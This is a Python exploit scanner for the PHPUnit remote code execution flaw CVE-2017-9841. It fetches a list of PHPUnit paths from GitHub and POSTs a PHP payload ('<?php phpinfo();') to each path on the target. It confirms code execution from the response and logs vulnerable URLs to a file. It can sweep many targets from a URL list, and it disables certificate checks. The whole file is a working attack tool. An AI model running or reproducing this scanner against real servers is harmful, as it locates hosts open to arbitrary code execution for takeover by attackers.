#!/usr/bin/env python
#
# 
#
# phpunit-brute.py - Finding paths to phpunit to gain RCE. (CVE-2017-9841)
#
# By @RandomRobbieBF
# 
#

import requests
import sys
import argparse
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=False ,default="http://localhost",help="URL to test")
parser.add_argument("-f", "--file", default="",required=False, help="File of urls")
parser.add_argument("-p", "--proxy", default="",required=False, help="Proxy for debugging")

args = parser.parse_args()
url = args.url
urls = args.file


if args.proxy:
	http_proxy = args.proxy
	os.environ['HTTP_PROXY'] = http_proxy
	os.environ['HTTPS_PROXY'] = http_proxy
	
	

            
           

def test_url(url,urlpath):
	newurl = ""+url+""+urlpath+""
	rawBody = "<?php phpinfo();"
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept":"*/*","Content-Type":"application/x-www-form-urlencoded"}
	try:
		response = session.post(newurl, headers=headers,verify=False,data=rawBody,timeout=30)
		if response.status_code == 200:
			if "PHP License as published by the PHP Group" in response.text:
				print("[+] Found RCE for "+newurl+" [+]")
				text_file = open("found.txt", "a")
				text_file.write(""+newurl+"\n")
				text_file.close()
				return True
			else:
				print("[-] No Luck for "+urlpath+" [-]")
		else:
			print("[-] No Luck for "+urlpath+" [-]")
	except Exception as e:
		print ("[-]Check Url might have Issues[-]")
		print(e)
		sys.exit(0)
			
			
def grab_paths(url):
	headers = {"User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	try:
		response = session.get("https://raw.githubusercontent.com/random-robbie/bruteforce-lists/master/phpunit.txt", headers=headers,verify=False)
		lines = response.text.strip().split('\n')
		for urlpath in lines:
			loop = test_url(url,urlpath)
			if loop:
				break
	except Exception as e:
		print("[-] Failed to obtain paths file [-]")
		print(e)
		sys.exit(0)
				


if urls:
	if os.path.exists(urls):
		with open(urls, 'r') as f:
			for line in f:
				url = line.replace("\n","")
				try:
					print("Testing "+url+"")
					grab_paths(url)
				except KeyboardInterrupt:
					print ("Ctrl-c pressed ...")
					sys.exit(1)
				except Exception as e:
					print('Error: %s' % e)
					pass
		f.close()
	

else:
	grab_paths(url)
